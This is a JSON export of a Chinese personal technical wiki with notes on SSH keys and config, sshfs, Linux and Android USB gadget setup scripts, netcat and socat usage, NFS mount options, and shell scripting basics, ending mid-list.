{"pages":[{"title":"About","date":"2019-12-22T08:30:11.844Z","path":"about/index.html","text":""},{"title":"Categories","date":"2019-12-22T08:30:11.844Z","path":"categories/index.html","text":""},{"title":"Tags","date":"2019-12-22T08:30:11.844Z","path":"tags/index.html","text":""}],"posts":[{"title":"","date":"2019-12-22T08:30:37.016Z","path":"wiki/uncategorized//","text":"title: do_divdate: 2019-07-03categories: 计算机 linux kernel","tags":[],"categories":[]},{"title":"","date":"2019-12-22T08:30:37.012Z","path":"wiki/uncategorized//","text":"title: libcdate: 2019-07-27categories: 电子工程 嵌入式开源项目 libc替代Libcmsul libchttps://www.musl-libc.org/ 为linux嵌入式设备设计的轻量C库，强调静态编译时的体积。 工具库tboxhttps://github.com/tboox/tboxA glib-like multi-platform c library 格式化输出tinyprintf [BSD/LGPL]https://github.com/cjlano/tinyprintf The formats supported by this implementation are: %% %c %d %i %o %p %u %s %x %X 功能比较全 支持利用宏剪裁 支持像”%4.4x” “%3d” “%lld”的格式 mini-printf [BSD]https://github.com/mludvig/mini-printf Minimal printf() implementation for embedded projects. %% %c %s %d %u %x %X 功能比较简单 只支持类似”%03d”这样的格式 无法支持像”%ld”这样的格式 xprintfc [LGPL]https://github.com/MarioViara/xprintfc 支持浮点数的libc sprintf替代 功能齐全 可用宏剪裁","tags":[],"categories":[]},{"title":"ssh","date":"2019-12-07T00:00:00.000Z","path":"wiki/计算机/linux/tools/ssh/","text":"openssh工具集123456789101112131415# 服务端sshd SSH 服务端程序sftp-server SFTP服务端程序ssh-agent ssh代理程序# 客户端ssh SSH协议的客户端程序，用来登入远程系统或远程执行命令slogin ssh的别名scp 文件传输客户端sftp 交互式sftp-server客户端，用法和ftp命令一样。# 秘钥管理ssh-add SSH代理相关程序，用来向SSH代理添加dsa keyssh-keygen 生成ssh公私钥ssh-keyscan 从其他主机上收集公钥 OpenSSH秘钥默认路径、权限设置、文件格式参考目录为~/.ssh，权限700。 私钥大概长这样，权限600。 1234567-----BEGIN RSA PRIVATE KEY-----MIIEoQIBAAKCAQEAiAbdVhzD0c+sWV2nMFIH9vA1z/zCTlti3EDoWFG9lGjyCjL2....wZMCgYBTglrAaucwtSgkPEuLXfiTIVGuobR3eQxOD19T+0uC16ddXsXiBSYOGH+wxgc+HU3ShNo9N1jIusuXJatXWL+MyUjpOWUtSre748duWd531UAHOIXPAHBdv5o2zgtiENtUwccic/HDVMl8i2K7cYocFE9Iem8wXoYz/eI/QM9vSA==-----END RSA PRIVATE KEY----- 1234默认路径：​```cmv ssh_private_key ~/.ssh/id_dsa 公钥位置在~/.ssh/authorized_keys，权限700。 大概长这样12ssh-rsa AAAAB3Nza.....F1Yatzmw==ssh-rsa AAAAB3Nza.....1+tinL1aWB/XgJQ== 临时指定某ssh-key用于建立ssh连接： 123$ ssh-agent$ ssh-add ~/.ssh/xxxx$ ssh user@xxx.com 不同的ssh服务器，自动使用不同的密钥123$ cd ~/.ssh$ touch config$ nano config 1234567891011Host exist_server HostName exist_server_IP/exist_server_domain IdentityFile ~/.ssh/id_rsa_exist_server PreferredAuthentications publickey User usernameHost github.com HostName github.com IdentityFile ~/.ssh/id_rsa_github PreferredAuthentications publickey User github_username sshfssshfs可以挂在一个sftp中的目录到本地路径上： 1234567mkdir -p /mnt/mysdk# 所有用户均可访问sudo sshfs -o allow_other user@xxx.xxx.xxx.xxx:/home/mpc/workspaces /mnt/mysdk# 仅当前用户访问sshfs user@xxx.xxx.xxx.xxx:/home/mpc/workspaces ~/mysdk 似乎没法用sshpass在这个命令上 sshpassssh不允许在参数里带密码，sshpass能加个-p参数带上密码。 例子，ssh免输入密码远程执行命令：1sshpass -p \"123456\" ssh root@xxx.xxx.xxx.xxx \"pwd;\" ssh保持会话1234ServerAliveInterval 60 ＃client每隔60秒发送一次请求给server，然后server响应，从而保持连接ServerAliveCountMax 3 ＃client发出请求后，服务器端没有响应得次数达到3，就自动断开连接，正常情况下，server不会不响应 ssh穿透-在docker容器里装git服务器把git服务器装在docker容器中时，如果要用SSH方式访问git仓库，又不想在使用时指定特殊的端口，就必须与宿主共享22端口。 参考：http://www.ateijelo.com/blog/2016/07/09/share-port-22-between-docker-gogs-ssh-and-local-system 在真实系统里创建名为git的用户 把UID和GID传入docker容器，一般是通过参数，在容器内entrypoint接收参数，使用指定UID/GID执行应用，以保证容器中创建的文件与宿主一致 配置SSH端口映射，如命令行 -v ~git/gogs:/data -p 127.0.0.1:10022:22 -p 3000:3000. 创建符号链接 /home/git/.ssh 到 gogs/git/.ssh 生成密钥对，供宿主与容器间通讯 执行： 123456789101112131415mkdir -p /app/gogs/cat >/app/gogs/gogs /home/git/.ssh/authorized_keysfissh -p 10022 -o StrictHostKeyChecking=no git@127.0.0.1 \\ SSH_ORIGINAL_COMMAND=$(printf '%q' \"$SSH_ORIGINAL_COMMAND\") \"$0\" \"$@\"ENDchmod 755 /app/gogs/gogs","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"android_usb_accessory","date":"2019-12-06T00:00:00.000Z","path":"wiki/计算机/android/android-usb-accessory/","text":"参考：安卓的配件：https://source.android.com/devices/accessories/custom配件中的AOA模式：https://source.android.com/devices/accessories/protocol 难点主要在device端移植，host端只需要用Libusb操作bulk端点即可。 device端实现 提取android中的usb_accessory驱动，编译成内核模块 挂上驱动，配置gadgets设备 脚本：123456789101112131415161718192021222324252627# load kernel modulemodprobe usb_f_accessory# 1. Creating the gadgetsmkdir $CONFIGFS_HOME/usb_gadget/g1cd $CONFIGFS_HOME/usb_gadget/g1echo 0x18D1 > idVendorecho 0x2D00 > idProduct# 2. Creating the configurationsmkdir configs/c.1# 3. Creating the functionsmkdir functions/accessory.usb0# 4. Associating the functions with their configurationsln -s functions/accessory.usb0 configs/c.1# 5. Enabling the gadget# $ echo > UDC# /sys/class/udc/UDC_NAME=`ls /sys/class/udc/ | awk \"{print $1}\"`echo $UDC_NAME > UDC# 6. Set Permissionchmod 666 /dev/usb_accessory 启动后，应用可通过读写/dev/usb_accessory与host通讯了 用host端例程来测试https://github.com/gibsson/linux-adk device端接收：1$ cat /dev/usb_accessory device端发送：1$ echo \"12345\" > /dev/usb_accessory 速度测试测试结果：双向通讯均能超过10Mbyte/s 应用tips 驱动没实现pull方法，所以select、poll、epoll均无法使用，只能开个线程阻塞读 驱动中没有缓存，read时得给根据高速/全速设备，给512/128bytes的缓冲区来读，否则可能漏收、阻塞着不返回","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"android","slug":"计算机/android","permalink":"http://wiki.noodlefighter.com/categories/计算机/android/"}]},{"title":"linux桌面系统维护笔记","date":"2019-12-06T00:00:00.000Z","path":"wiki/计算机/linux/distribution/linux桌面系统维护笔记/","text":"救援模式linux无法启动时，可以进LiveCD，mount整个rootfs，然后chroot，再进行修复操作，如： 12345678$ su -# mkdir rootfs# mount /dev/sdb2 rootfs# mount /dev/sdb1 rootfs/boot/efi# mv /dev ./rootfs/# mv /proc ./rootfs/# cd rootfs# chroot . 在archlinux下，使用arch-chroot替代chroot，无需移动设备文件，如： 123456789$ sudo pacman-mirror -c China$ sudo pacman -Sy$ sudo pacman -S arch-install-scripts$ su -# mkdir rootfs# mount /dev/sdb2 rootfs# mount /dev/sdb1 rootfs/boot/efi# cd rootfs# arch-chroot . 重建grub配置1# grub-mkconfig -o /boot/efi/grub/grub.cfg","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"distribution","slug":"计算机/linux/distribution","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/distribution/"}]},{"title":"linux_usb_gadget","date":"2019-12-06T00:00:00.000Z","path":"wiki/计算机/linux/kernel/linux-usb-gadget/","text":"Linux USB GadgetLinux下的USB从设备叫USB Gadget。 http://www.linux-usb.org/gadget/ https://www.kernel.org/doc/html/latest/driver-api/usb/gadget.html https://www.kernel.org/doc/html/latest/usb/gadget_serial.html https://www.kernel.org/doc/html/latest/usb/functionfs.html 使用gadgetfs创建自己的usb设备： https://blog.soutade.fr/post/2016/07/create-your-own-usb-gadget-with-gadgetfs.html 如何用起现有gadget里的functionPPT，Make your own USB gadget： https://events.static.linuxfound.org/sites/events/files/slides/LinuxConNA-Make-your-own-USB-gadget-Andrzej.Pietrasiewicz.pdf gadget的configfs配置： https://www.kernel.org/doc/Documentation/usb/gadget_configfs.txt 实现一个MTP Server（设备端）http://www.trivialfeat.com/home/2016/11/17/media-transfer-protocol-in-a-usb-composite-gadget 文章中提到一个现成的kernel的patch。 文章备份： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256## Options:- ANDROID MTP : - https://android.googlesource.com/platform/frameworks/base/+/master/media/jni/ - Apache 2.0 license. - Requires Android configfs MTP gadget module which is not in the Linux kernel. - Seems to be very closely tied to Android media code and require many other android libraries that I did not want to merge.- TIZEN MTP : - https://build.tizen.org/package/show?package=mtp-responder&project=Tizen%3AIVI - Apache 2.0 license. - Requires GLIB 2.0 and some capi that would inflate our image size by a good bit.- BUTEO MTP : - Current repo: https://git.merproject.org/mer-core/buteo-mtp/tree/master - Repo I used: https://github.com/pcercuei/buteo-mtp (Pcercuei already separated it from buteo-syncfw here, see next bullet) - Newer version of buteo is intrinsically tied to buteo-syncfw. buteo-syncfw requires many more platform code packages to be pulled in from the Meego or Mer code base. Since this added code handles config and networking etc, it was not very useful to me. - Buteo was originally written for gadgetfs and alot of the documentation still shows this. However, Buteo now uses functionfs gadget module with configfs. This adds to the confusion a bit.- UBUNTU MTP : - http://bazaar.launchpad.net/~phablet-team/mtp/trunk/files - Requires Boost library with certain packages, dbus-cpp, libglog. Boost library will inflate our image size a good bit. - Also requires bazaar installed on the dev machine to pull from the Ubuntu repo. - Requires Android configfs MTP gadget module which is not in the Linux kernel.- uMTP-Responder - https://github.com/viveris/uMTP-Responder - Thanks to Jean-François DEL NERO for the update on this. - Recently released by Viveris under GPLv3. (This is newer than the instructions here) - Implemented in C, in user space and use the GadgetFs layer. - This is most likely a better option than the instructions below. Give it a try!## Implementation:Note: There may be a better and more proper Linux way to implement MTP, but in the time frame I have, this was the fastest working way I found with existing code. It seems that good details are hard to find on MTP responders when you don't want to write your own.I first began looking at buteo since it used functionfs which is already in the kernel. I was able to pull the old version and build it. Running the binary seemed to work, however attaching the gadget configuration to the UDC caused a kernel oops every time.Ubuntu was the second flavor I tried and ultimately found success. Thank you Android and Canonical phablet team! Here's the steps and files necessary to pull Ubuntu's MTP daemon into a buildroot system:**1. Pull down the kernel patch for the MTP gadget driver that was never accepted into the kernel. Add this to your build.**1. https://patches.linaro.org/patch/52411/2. Download from the patch link3. cp RFC-1-2-usb-gadget-configfs-add-MTP-function.patch **2. Select the newly added MTP gadget option in the kernel config**1. make linux-menuconfig2. Device Drivers -> USB Support -> USB Gadget Support -> USB Gadget Drivers -> USB functions configurable through configfs3. Select MTP gadget4. Also select any others you want to use. I'm also selecting ACM serial and Mass Storage.3. Save the configuration to your default config (optional)make linux-savedefconfigcp output/build/linux-linux4sam_5.3/defconfig 4. Setup ubuntu-mtp package in buildrootcd mkdir ubuntu-mtpAdd Config.in:config BR2_PACKAGE_UBUNTU_MTP bool \"ubuntu-mtp\" select BR2_PACKAGE_BOOST select BR2_PACKAGE_BOOST_THREAD select BR2_PACKAGE_BOOST_SYSTEM select BR2_PACKAGE_BOOST_FILESYSTEM select BR2_PACKAGE_BOOST_TEST select BR2_PACKAGE_DBUS_CPP select BR2_PACKAGE_GLOG help Media Transfer Protocol (MTP) stack from Ubuntu http://bazaar.launchpad.net/~phablet-team/mtp5. Add ubuntu-mtp.mk. Note that I am using sed to replace tags added in the patch file.############################################################### Ubuntu MTP responder# source http://bazaar.launchpad.net/~phablet-team/mtp/trunk# Adding as a local package to avoid baazar requirement##############################################################UBUNTU_MTP_VERSION = 71UBUNTU_MTP_SITE = file://$(TOPDIR)/Company/package/ubuntu-mtpUBUNTU_MTP_DEPENDENCIES = boost dbus-cppUBUNTU_MTP_LICENSE = GPLv3UBUNTU_MTP_LICENSE_FILES = COPYINGUBUNTU_MTP_INSTALL_STAGING = yesdefine UBUNTU_MTP_SET_PROPERTIES $(SED) \"s/---MANUFACTURER---/Company Name/\" $(@D)/src/MtpServer.cpp $(SED) \"s/---MODEL---/Product Name/\" $(@D)/src/MtpServer.cpp $(SED) \"s/---SERIAL---/Serial Number/\" $(@D)/src/MtpServer.cppendefUBUNTU_MTP_PRE_CONFIGURE_HOOKS += UBUNTU_MTP_SET_PROPERTIES$(eval $(cmake-package))6. Add patches to package directory. These patches strip out code that ties it to the ubuntu phablet and hard codes some config options. they also modify some build files to include libraries. Some assembly required here. Note you may want to modify these patch files to expose the proper disk locations. Currently, i'm exposing the /root partition for testing.0001-CMake-remove-android-libraries-and-fix-module-names.patch0002-remove-android-properties-and-ubuntu-phablet-specific.patch0003-convert-android-properties-to-hardcoded-strings.patch7. Pull down the MTP responder from the ubuntu bzr repo. Note: I saved the tgz to our repo so that bazaar is not a requirement for the buildDownload the tarball here: http://bazaar.launchpad.net/~phablet-team/mtp/trunk/revision/71?start_revid=71Add this to your ubuntu-mtp package directory8. Package is done, add it to the top level Config.invim ../../Config.in9. Select it in the menuconfig along with the dependencies and hope it buildsmake menuconfigUser Provided Optionsselect ubuntu-mtp10. After it builds and installs, create the gadget startup script. Simple example shown here. Also, get your own vid/pid ya bum!.vim /etc/init.d/S99-gadget#!/bin/shCONFIGFS=\"/sys/kernel/config\"GADGET=\"$CONFIGFS/usb_gadget\"VID=\"0x0000\"PID=\"0x0000\"SERIAL=\"0123456789\"MANUF=\"Me\"PRODUCT=\"Radget\"case \"$1\" in start) echo \"Creating the USB gadget\" echo \"Loading composite module\" modprobe libcomposite echo \"Mounting ConfigFS\" mount -t configfs none $CONFIGFS cd $GADGET if [ $? -ne 0 ]; then echo \"Error setting up configfs\" exit 1; fi echo \"Creating gadget directory\" mkdir gadget cd gadget if [ $? -ne 0 ]; then echo \"Error creating usb gadget in configfs\" exit 1; fi echo \"Setting Vendor and Product ID's\" echo $VID > idVendor echo $PID > idProduct echo \"Setting English strings\" mkdir strings/0x409 echo $SERIAL > strings/0x409/serialnumber echo $MANUF > strings/0x409/manufacturer echo $PRODUCT > strings/0x409/product echo \"Setting configuration\" mkdir configs/c.1 mkdir configs/c.1/strings/0x409 echo \"CDC ACM + MTP + Mass Storage\" > configs/c.1/strings/0x409/configuration echo 120 > configs/c.1/MaxPower echo \"Creating ACM interface\" mkdir functions/acm.GS0 ln -s functions/acm.GS0 configs/c.1 echo \"Creating MTP interface\" mkdir functions/mtp.mtp ln -s functions/mtp.mtp configs/c.1 mkdir /dev/mtp mount -t functionfs mtp /dev/mtp echo \"Creating Mass Storage interface\" mkdir functions/mass_storage.ms0 echo \"/dev/mmcblk0\" > functions/mass_storage.ms0/lun.0/file echo \"1\" > functions/mass_storage.ms0/lun.0/removable ln -s functions/mass_storage.ms0 configs/c.1/mass_storage.ms0 echo \"Binding USB Device Controller\" echo `ls /sys/class/udc` > UDC echo \"Starting the MTP responder daemon\" mtp-server & ;; stop) echo \"Stopping the USB gadget\" echo \"Killing MTP responder daemon\" killall mtp-server cd $GADGET/gadget if [ $? -ne 0 ]; then echo \"Error: no configfs gadget found\" exit 1; fi echo \"Unbinding USB Device Controller\" echo \"\" > UDC echo \"Removing Mass Storage interface\" rm configs/c.1/mass_storage.ms0 rmdir functions/mass_storage.ms0 echo \"Removing MTP interface\" umount /dev/mtp rmdir /dev/mtp rm configs/c.1/mtp.mtp rmdir functions/mtp.mtp echo \"Removing ACM interface\" rm configs/c.1/acm.GS0 rmdir functions/acm.GS0 echo \"Clearing English strings\" rmdir strings/0x409 echo \"Cleaning up configuration\" rmdir configs/c.1/strings/0x409 rmdir configs/c.1 echo \"Removing gadget directory\" cd $GADGET rmdir gadget cd / echo \"Unmounting ConfigFS\" umount $CONFIGFS ;;esac11. The gadget should show up now when plugged in. Here's a quick screen cap of the directory structure showing the /root partition that i'm exposing.","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"kernel","slug":"计算机/linux/kernel","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/kernel/"}]},{"title":"fuse","date":"2019-12-06T00:00:00.000Z","path":"wiki/计算机/linux/tools/fuse/","text":"FUSE文件系统，即filesystem in userspace，是linux kernel提供的一个功能模块，支持用户态程序实现文件系统。lsmod | grep fuse能看到这个内核模块。 配置文件在/etc/fuse.conf。 帮助文档：$ man fuse，有一些通用选项（OPTIONS），在mount时指定以改变FUSE的行为。 例如通过sshfs，可以将ssh目标的目录mount到本地，允许root用户访问： 1$ sshfs r@r-lc:/home/r/proj/sk02/skpi_root /home/pi/skpi_root -o allow_root","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"netcat","date":"2019-12-06T00:00:00.000Z","path":"wiki/计算机/linux/tools/netcat/","text":"netcat的两个版本一般发行版仓库里有两个版本: bsd-netcat gnu-netcat gnu这个用的时候得注意这样是不行的, 得用-p参数指定端口1nc -l 9898 很好, 我选择bsd的实现. 类似的工具nc缺少一些功能如端口转发，类似工具： https://nmap.org/ncat/ http://www.dest-unreach.org/socat/doc/socat.html 用nc测试不断地连接、断开1watch -n 0.1 \"echo sdfadf |nc -w0 -N localhost 4646\" socat - Multipurpose relayhttp://www.dest-unreach.org/socat/http://www.dest-unreach.org/socat/doc/socat.html “多用途中继”,看着是想代替netcat. 使用socat监听unix socket12$ sudo mv /path/to/sock /path/to/sock.original$ sudo socat -t100 -x -v UNIX-LISTEN:/path/to/sock,mode=777,reuseaddr,fork UNIX-CONNECT:/path/to/sock.original 例：123456789101112$ sudo socat -t100 -x -v UNIX-LISTEN:/var/run/ubus.sock,mode=777,reuseaddr,fork UNIX-CONNECT:/var/run/ubus.sock.original< 2019/11/28 19:37:35.355383 length=12 from=0 to=11 00 00 00 00 8a fe d1 a8 00 00 00 04 ............--> 2019/11/28 19:37:35.355631 length=12 from=0 to=11 00 04 00 01 00 00 00 00 00 00 00 04 ............--< 2019/11/28 19:37:35.355823 length=20 from=12 to=31 00 01 00 01 00 00 00 00 00 00 00 0c 01 00 00 08 ................ 00 00 00 00 ....--","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"nfs","date":"2019-12-06T00:00:00.000Z","path":"wiki/计算机/linux/tools/nfs/","text":"服务器配置：12# apt install nfs-kernel-server# vi 编辑配置/etc/exports：1/home/dev/workspaces/hi3516a/nfs *(rw,sync,no_subtree_check) 挂载：1mount -t nfs localhost:/home/dev/workspaces/hi3516a/nfs /mnt/nfs 错误记录12svc: failed to register lockdv1 RPC service (errno 111)加个-o nolock Arch Linux上的参考https://wiki.archlinux.org/index.php/NFS windows上挂载NFS 先去“添加删除软件”那里开启nfs client功能 在cmd.exe下使用mount命令挂载（powershell不行，那里也有mount命令但不是nfs这个）： 1mount 192.168.3.114:/root/nfsroot z: 注意，windows不支持UTF8挂载。 1234C:\\Users\\r>mount -o lang=UTF-8 192.168.3.114:/root/nfsroot z:ERROR - Unrecognized lang type.Use lang = euc-jp|euc-tw|euc-kr|shift-jis|big5|ksc5601|gb2312-80|ansi only 有人说这样能解决部分问题（“但是当接收别人平台发送的文件的时候，还是会出现乱码”，意思是会导致其他程序出问题？毕竟从习惯上都默认windows不使用utf8做文件名）： nfs选项描述 via: https://www.thegeekdiary.com/common-nfs-mount-options-in-linux/ rw (read/write) / ro (read-only)– Use rw for data that users need to modify. In order for you to mount a directory read/write, the NFS server must export it read/write.– Use ro for data you do not want users to change. A directory that is automounted from several servers should be read-only, to keep versions identical on all servers.– the default is rw. suid / nosuid– Specify suid if you want to allow mounted programs that have setuid permission to run with the permissions of their owners, regardless of who starts them. If a program with setuid permission is owned by root, it will run with root permissions, regardless of who starts it.– Specify nosuid to protect your system against setuid programs that may run as root and damage your system.– the default is suid. hard / soft– Specify hard if users will be writing to the mounted directory or running programs located in it. When NFS tries to access a hard-mounted directory, it keeps trying until it succeeds or someone interrupts its attempts. If the server goes down, any processes using the mounted directory hang until the server comes back up and then continue processing without errors. Interruptible hard mounts may be interrupted with CTRL-C or kill (see the intr option, later).– Specify soft if the server is unreliable and you want to prevent systems from hanging when the server is down. When NFS tries to access a soft-mounted directory, it gives up and returns an error message after trying retrans times (see the retrans option, later). Any processes using the mounted directory will return errors if the server goes down.– Default is hard intr / nointr– Specify intr if users are not likely to damage critical data by manually interrupting an NFS request. If a hard mount is interruptible, a user may press [CTRL]-C or issue the kill command to interrupt an NFS mount that is hanging indefinitely because a server is down.– Specify nointr if users might damage critical data by manually interrupting an NFS request, and you would rather have the system hang while the server is down than risk losing data between the client and the server.– The default is intr. fg (foreground) / bg (background)– Specify fg for directories that are necessary for the client machine to boot or operate correctly. If a foreground mount fails, it is retried again in the foreground until it succeeds or is interrupted. All automounted directories are mounted in the foreground; you cannot specify the bg option with automounted directories.– Specify bg for mounting directories that are not necessary for the client to boot or operate correctly. Background mounts that fail are re-tried in the background, allowing the mount process to consider the mount complete and go on to the next one. If you have two machines configured to mount directories from each other, configure the mounts on one of the machines as background mounts. That way, if both systems try to boot at once, they will not become deadlocked, each waiting to mount directories from the other. The bg option cannot be used with automounted directories.– The default is fg. devs / nodevs– Specify devs if you are mounting device files from a server whose device files will work correctly on the client. The devs option allows you to use NFS-mounted device files to read and write to devices from the NFS client. It is useful for maintaining a standard, centralized set of device files, if all your systems are configured similarly.– Specify nodevs if device files mounted from a server will not work correctly for reading and writing to devices on the NFS client. The nodevs option generates an error if a process on the NFS client tries to read or write to an NFS-mounted device file.– The default is devs. timeo=n– The timeout, in tenths of a second, for NFS requests (read and write requests to mounted directories). If an NFS request times out, this timeout value is doubled, and the request is retransmitted. After the NFS request has been retransmitted the number of times specified by the retrans option (see below), a soft mount returns an error, and a hard mount retries the request. The maximum timeo value is 30 (3 seconds).– Try doubling the timeo value if you see several servers not responding messages within a few minutes. This can happen because you are mounting directories across a gateway, because your server is slow, or because your network is busy with heavy traffic.– Default is timeo=7 retrans=n– The number of times an NFS request (a read or write request to a mounted directory) is retransmitted after it times out. If the request does not succeed after n retransmissions, a soft mount returns an error, and a hard mount retries the request.– Increase the retrans value for a directory that is soft-mounted from a server that has frequent, short periods of downtime. This gives the server sufficient time to recover, so the soft mount does not return an error.– The default is retrans=4. retry=n– The number of times the NFS client attempts to mount a directory after the first attempt fails. If you specify intr, you can interrupt the mount before n retries. However, if you specify nointr, you must wait until n retries have been made, until the mount succeeds, or until you reboot the system.– If mounts are failing because your server is very busy, increasing the retry value may fix the problem.– The default is retry=1. rsize=n– The number of bytes the NFS client requests from the NFS server in a single read request.– If packets are being dropped between the client and the server, decrease rsize to 4096 or 2048. To find out whether packets are being dropped, issue the “nfsstat -rc” command at the HP-UX prompt. If the timeout and retrans values returned by this command are high, but the badxid number is close to zero, then packets are being dropped somewhere in the network.– The default is rsize=8192. wsize=n– The number of bytes the NFS client sends to the NFS server in a single write request.– If packets are being dropped between the client and the server, decrease wsize to 4096 or 2048. To find out whether packets are being dropped, issue the “nfsstat -rc” command at the HP-UX prompt. If the timeout and retrans values returned by this command are high, but the badxid number is close to zero, then packets are being dropped somewhere in the network.– The default is wsize=8192. O (Overlay mount)– Allows the file system to be mounted over an existing mount point, making the underlying file system inaccessible. If you attempt to mount a file system over an existing mount point without the -O option, the mount will fail with the error device busy.– Caution: Using the -O mount option can put your system in a confusing state. The -O option allows you to hide local data under an NFS mount point without receiving any warning. Local data hidden beneath an NFS mount point will not be backed up during regular system backups.– On HP-UX, the -O option is valid only for NFS-mounted file systems. For this reason, if you specify the -O option, you must also specify the -F nfs option to the mount command or the nfs file system type in the /etc/fstab file.– The default value is not specified for the parameter. remount– If the file system is mounted read-only, this option remounts it read/write. This allows you to change the access permissions from read-only to read/write without forcing everyone to leave the mounted directory or killing all processes using it.– The Default value is not specified for this parameter. noac– If specified, this option prevents the NFS client from caching attributes for the mounted directory.– Specify noac for a directory that will be used frequently by many NFS clients. The noac option ensures that the file and directory attributes on the server are up to date, because no changes are cached on the clients. However, if many NFS clients using the same NFS server all disable attribute caching, the server may become overloaded with attribute requests and updates. You can also use the actimeo option to set all the caching timeouts to a small number of seconds, like 1 or 3.– If you specify noac, do not specify the other caching options.– The Default value is not specified for this parameter. nocto– If specified, this option suppresses fresh attributes when opening a file.– Specify nocto for a file or directory that never changes, to decrease the load on your network.– The Default value is not specified for this parameter. acdirmax=n– The maximum number of seconds a directory’s attributes are cached on the NFS client. When this timeout period expires, the client flushes its attribute cache, and if the attributes have changed, the client sends them to the NFS server.– For a directory that rarely changes or that is owned and modified by only one user, like a user’s home directory, you can decrease the load on your network by setting acdirmax=120 or higher.– The Default value is acdirmax=60. acdirmin=n– The minimum number of seconds a directory’s attributes are cached on the NFS client. If the directory is modified before this timeout expires, the timeout period is extended by acdirmin seconds.– For a directory that rarely changes or that is owned and modified by only one user, like a user’s home directory, you can decrease the load on your network by setting acdirmin=60 or higher.– The Default value is acdirmin=30. acregmax=n– The maximum number of seconds a file’s attributes are cached on the NFS client. When this timeout period expires, the client flushes its attribute cache, and if the attributes have changed, the client sends them to the NFS server.– For a file that rarely changes or that is owned and modified by only one user, like a file in a user’s home directory, you can decrease the load on your network by setting acregmax=120 or higher.– The Default value is acregmax=60. actimeo=n– Setting actimeo to n seconds is equivalent to setting acdirmax, acdirmin, acregmax, and acregmin to n seconds.– Set actimeo=1 or actimeo=3 for a directory that is used and modified frequently by many NFS clients. This ensures that the file and directory attributes are kept reasonably up to date, even if they are changed frequently from various client locations.– Set actimeo=120 or higher for a directory that rarely or never changes.– If you set the actimeo value, do not set the acdirmax, acdirmin, acregmax, or acregmin values.– The default value is not set for this parameter. vers=n– The version of the NFS protocol to use. By default, the local NFS client will attempt to mount the file system using NFS version 3. If the NFS server does not support version 3, the file system will be mounted using version 2.– If you know that the NFS server does not support version 3, specify vers=2, and you will save time during the mount, because the client will not attempt to use version 3 before using version 2.– The default value for the parameter is vers=3. grpid– Forces a newly created file in the mounted file system to inherit the group ID of the parent directory.– By default, a newly created file inherits the effective group ID of the calling process, unless the GID bit is set on the parent directory. If the GID bit is set, the new file inherits the group ID of the parent directory.– The default value is not set for this parameter.","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"shell脚本编程","date":"2019-12-06T00:00:00.000Z","path":"wiki/计算机/编程/shell脚本编程/","text":"技巧获取脚本所在目录获取脚本所在路径, 而不是$PWD: 1cd \"$(dirname \"$0\")\" 1SHELL_DIR=$(cd \"$(dirname \"$0\")\";pwd) 当需要用source调用这个脚本时，上面这个$0是不可靠的，得换成${BASH_SOURCE[0]}： https://stackoverflow.com/questions/35006457/choosing-between-0-and-bash-source 判断环境变量是否存在12345if [ -z $JAVA_HOME ];then echo \"not exists\"else echo \"JAVA_HOME = $JAVA_HOME\"fi 查看进程是否存在123456ps -fe|grep hostapd |grep -v grepif [ $? -ne 0 ]; then echo \"start process.....\"else echo \"runing.....\"fi 传参12345$0 第0个参数(执行的命令本身)$1 第1个参数$2 第2个参数$# 参数数量, \"ps -a\"有1个参数；\"tar -xf aaa.tar\"有2个参数$? 上一条命令返回值 if语句1234567if [ 条件 ];then echo \"do some thing\"elif [ 条件 ];then echo \"do some thing\"else echo \"do some thing\"fi for语句12345678910111213# 遍历多行文本my_multiline_str=\"a\\b\\c\"for line in $my_multiline_str;do echo \"${line}\"done# 遍历数组, 千万别写成了遍历多行文本的形式...血泪教训my_array=(a b c)for item in ${my_array[@]};do echo \"${item}\"done while语句计算1到100的和 123456789#!/bin/bashi=1sum=0while [ $i -le 100 ]do let sum=sum+$i let i++doneecho $sum 死循环 1234while :do echo ...done 文件判断12345678910111213141516171819202122[ -b FILE ] 如果 FILE 存在且是一个块特殊文件则为真。[ -c FILE ] 如果 FILE 存在且是一个字特殊文件则为真。[ -d DIR ] 如果 FILE 存在且是一个目录则为真。[ -e FILE ] 如果 FILE 存在则为真。[ -f FILE ] 如果 FILE 存在且是一个普通文件则为真。[ -g 